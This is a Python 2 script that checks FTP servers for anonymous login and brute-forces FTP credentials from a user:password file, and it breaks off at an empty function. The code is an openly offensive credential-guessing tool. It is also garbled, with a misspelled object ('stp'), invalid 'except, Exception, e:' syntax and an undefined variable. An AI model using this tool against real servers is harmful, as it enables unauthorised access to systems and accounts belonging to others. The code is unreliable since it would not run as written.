#!/usr/bin/env python

import ftplib
import optparse
import time

def anonLogin(hostname):
	try:
		ftp = ftplib.FTP(hostname)
		stp.login('anonymous', 'me@your.com')
		print '\n[*] ' + str(hostname) \
				+ ' FTP Anonymous Login Succeeded.'
		ftp.quit()
		return True
	except, Exception, e:
		print '\n[-] ' + str(anonymous) +\
				'FTPanonymous Logon Faild.'
		return False
def bruteLogin(hostname, passwdFile):
	pF = open(passwdFile, 'r') 
	for line in pF.readlines():
		time.sleep(1)
		userName = line.split(':')[0]
		passWord = line.split(':')[1].strip('\r')
		print '[+] Trying: ' + userName + '/' +passWord
		try:
			ftp = ftplib.FTP(hostname)
			ftp.login(userName, passWord)
			print '\n[*] ' + str(hostname) +\
					'FTP Logon Succeeded: '+userName+\
					'/'+passWord
			ftp.quit()
			return (userName, passWord)
		except, Exception, e:
			pass
	print '\n[-] Could not brute force FTP credentials.'
	return (None, None)
def returnDefault(ftp):
 
